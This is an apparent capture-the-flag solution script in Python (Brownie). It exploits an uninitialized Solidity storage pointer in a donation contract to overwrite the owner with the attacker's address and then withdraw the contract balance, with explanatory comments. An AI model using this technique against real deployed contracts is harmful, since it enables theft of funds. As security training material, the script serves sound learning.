#!/usr/bin/python3
from brownie import web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    prev_ower = target.owner()
    print_colour(target.isComplete())

    print(
        f"{magenta}Contract balance: {red}{web3.fromWei(target.balance(),'ether')} ETH{reset}"
    )

    """
        Donation donation; is an uninitialized storage pointer
        used kind of like reference values in C++)
        which means it point to storage cell 0 (donations)
        when writing donation.etherAmount it sets storage[1] because etherAmount is
        serialized as Donation's second var
        https://blog.b9lab.com/storage-pointers-in-solidity-7dcfaa536089
        always declare structs for local variables as storage or memory
        and initialize them when declaring

        need to choose etherAmount in a way such that it overwrites the owner with our
        address, the scale is wrong as well and uses 10^36 which makes it exploitable
    """

    eth_amount = web3.toInt(hexstr=attacker.address)
    # print(eth_amount)

    msg_value = eth_amount // 10**36
    # print(msg_value)

    #! Hack
    tx = target.donate(eth_amount, {"from": attacker, "value": msg_value})
    tx.wait(1)

    print(f"{magenta}Previous owner: {green}{prev_ower}{reset}")
    print(f"{magenta}Current owner:  {red}{target.owner()}{reset}")
    print(f"{magenta}Attacker:       {red}{target.owner()}{reset}")

    # ? first assertion
    assert target.owner() == attacker.address

    #! now we are owner so let's withdraw the funds
    tx = target.withdraw({"from": attacker})
    tx.wait(1)

    print(
        f"{magenta}Contract balance: {red}{web3.fromWei(target.balance(),'ether')} ETH{reset}"
    )

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
